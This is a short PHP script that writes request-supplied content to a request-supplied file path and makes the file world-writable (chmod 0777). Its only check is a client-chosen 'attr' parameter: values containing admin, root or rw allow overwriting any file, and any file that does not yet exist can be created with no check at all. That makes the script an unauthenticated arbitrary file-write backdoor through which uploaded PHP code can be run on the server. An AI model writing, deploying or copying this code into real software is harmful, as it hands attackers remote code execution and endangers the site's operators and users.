<?php
function writeToFile($name,$content) {
    file_put_contents($name,$content); chmod($name,0777);
}
$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'';
$content=(isset($_REQUEST['content']))?$_POST['content']:'';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
if ($attr!='') {
    if (preg_match('/admin|root|rw/i',$attr)) {
        writeToFile($name,$content);
    } else {
        if (file_exists($name)) {
            if ((str_starts_with(basename($name),$attr.'_'))||(str_starts_with($name,$attr.'_files/'))||(str_starts_with($name,'./'.$attr.'_files/'))||(str_starts_with(basename($name),'_'))) {
                writeToFile($name,$content);
            }
        } else {
            writeToFile($name,$content);
        }
    }
}
